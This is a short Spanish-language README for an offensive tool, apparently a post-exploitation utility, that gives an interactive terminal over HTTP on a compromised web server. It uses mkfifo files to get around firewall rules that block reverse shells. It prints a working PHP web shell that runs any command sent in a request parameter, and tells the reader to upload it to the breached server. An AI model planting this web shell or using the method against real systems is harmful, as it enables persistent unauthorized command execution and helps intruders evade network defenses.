# TTYOverHTTP

En ocasiones cuando comprometemos un servidor web, hay reglas configuradas (**Ej: iptables**) que nos impiden obtener una Reverse Shell vía Netcat, Python, u otra utilidad.

Con esta herramienta, evitamos tener que hacer uso de una reverse shell para
obtener una TTY posteriormente completamente interactiva. A través de archivos
'**mkfifo**', jugamos para simular una TTY interactiva sobre HTTP, logrando
manejarnos sobre el sistema cómodamente sin ningún tipo de problema.

Lo único que necesitamos, es subir al servidor comprometido una estructura PHP como la siguiente para ejecutar comandos:

```php
<?php
	echo shell_exec($_REQUEST['cmd']);
?>
```

Una vez subido, simplemente ejecutamos el script (Es necesario cambiar la ruta en el script donde se sitúa nuestro script PHP alojado en el servidor vulnerado).

Tras su ejecución, se muestra un ejemplo de su utilidad:

<div style="text-align:center"><img src="https://funkyimg.com/i/2VKJz.png" /></div>

